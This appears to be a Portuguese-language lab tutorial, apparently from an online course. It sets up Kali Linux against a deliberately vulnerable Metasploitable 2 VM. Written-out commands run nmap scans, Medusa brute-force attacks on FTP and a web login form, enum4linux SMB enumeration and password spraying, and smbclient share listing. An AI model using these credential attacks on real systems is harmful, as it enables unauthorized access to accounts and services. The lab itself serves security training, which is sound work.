Preparando o ambiente com Kali Linux e Metasploitable 2

Tecnologias: Kali Linux, Metasploitable 2

Objetivo: Montar um ambiente com duas máquinas (atacante e alvo) que se comuniquem para testar vulnerabilidades (foco inicial: serviço FTP).

Vídeo de referência:

https://www.youtube.com/watch?v=nVncYYHj5Tw

Dica: Use snapshots na VM (VirtualBox/VMware). Salva tempo e evita choro quando algo quebrar. 😅

Máquinas

Máquina 1: Kali Linux — máquina atacante

Máquina 2: Metasploitable 2 — máquina alvo (servidor intencionalmente vulnerável)

Alcançando a máquina vulnerável (Metasploitable 2)

Vídeo de referência:

https://www.youtube.com/watch?v=ieRokGUqLY8&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Objetivo

Testar as vulnerabilidades da Máquina 2 (simulando um servidor desatualizado).
Foco inicial: serviço FTP.

Passo 1 — IP do alvo

Verifique conectividade e se as máquinas estão na mesma rede:

# Substitua pelo IP do alvo
ping -c 3 192.0.0.0

Passo 2 — Enumeração (Nmap)

Descobrir portas e serviços em operação. Escaneie as portas de interesse:

# Substitua pelo IP do alvo
nmap -sV -p 21,22,80,139,445 192.0.0.0


-sV tenta identificar a versão dos serviços em execução.

Criando wordlists simples (usuários e senhas)

Vídeo de referência:

https://www.youtube.com/watch?v=1Ev-L2eRhyA&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Crie um arquivo com usuários comuns:

echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt


Crie um arquivo com senhas comuns:

echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt

Ataque de força bruta com Medusa (FTP)
# Substitua pelo IP do alvo
medusa -h 192.0.0.0 -U users.txt -P pass.txt -M ftp -t 6


-t 6 = threads (acelera os testes).
Se houver sucesso, o Medusa retornará combinações válidas de usuário/senha para FTP.

Ataques de força bruta em formulários web

Vídeo de referência:

https://www.youtube.com/watch?v=_vFgoPlz6-8

Para atacar logins web precisamos inspecionar o formulário (Network / DevTools) e descobrir parâmetros que o servidor espera. Com isso, podemos automatizar tentativas.

Usando Medusa contra formulário HTTP

Vídeo de referência:

https://www.youtube.com/watch?v=Yc5s7T_plao&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Exemplo de comando (ajuste PAGE, FORM, FAIL, IP e paths conforme o alvo):

medusa -h 192.0.0.0 -U users.txt -P pass.txt -M http \
  -m PAGE:'/alvo/formulario.php' \
  -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
  -m FAIL:'Login failed' -t 6


Use medusa -M http -q para tentar descobrir parâmetros comuns do formulário.

Resultado esperado: combos de login válidos para o site.

Ataque em cadeia: enumeração SMB + password spraying

Vídeo de referência:

https://www.youtube.com/watch?v=jVr9gG3nclg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Contexto: descobrir um login válido em ambientes corporativos mal configurados. O SMB (Server Message Block) é usado para compartilhamento de arquivos/recursos; implementações comuns usam Samba.

Simulação comum

Obtivemos acesso à rede internamente e encontramos um SMB ativo.

Estratégia: password spraying — testar várias contas com a mesma (poucas) senha(s) comuns para evitar bloqueios por detecção de brute force.

Etapa 1 — Enumeração de usuários com enum4linux
# Substitua pelo IP do alvo
enum4linux -a 192.0.0.0 | tee enum4_output.txt


-a executa técnicas automáticas de enumeração.

tee salva a saída em enum4_output.txt.

Criando lista de usuários a partir do enum4linux

Vídeo de referência:

https://www.youtube.com/watch?v=fQLlZsLe_4Y&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

Pegue os nomes coletados no enum4_output.txt e monte sua wordlist de usuários para o próximo passo (password spraying).

Testando acesso com smbclient

Vídeo de referência:

https://www.youtube.com/watch?v=q-kk9GYUg_o

Usando credenciais coletadas:

# Lista recursos compartilhados (pedirá usuário/senha)
smbclient -L //192.0.0.0 -U user

Recursos e vídeos citados

https://www.youtube.com/watch?v=nVncYYHj5Tw

https://www.youtube.com/watch?v=ieRokGUqLY8&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

https://www.youtube.com/watch?v=1Ev-L2eRhyA&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

https://www.youtube.com/watch?v=_vFgoPlz6-8

https://www.youtube.com/watch?v=Yc5s7T_plao&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

https://www.youtube.com/watch?v=jVr9gG3nclg&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

https://www.youtube.com/watch?v=fQLlZsLe_4Y&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE

https://www.youtube.com/watch?v=q-kk9GYUg_o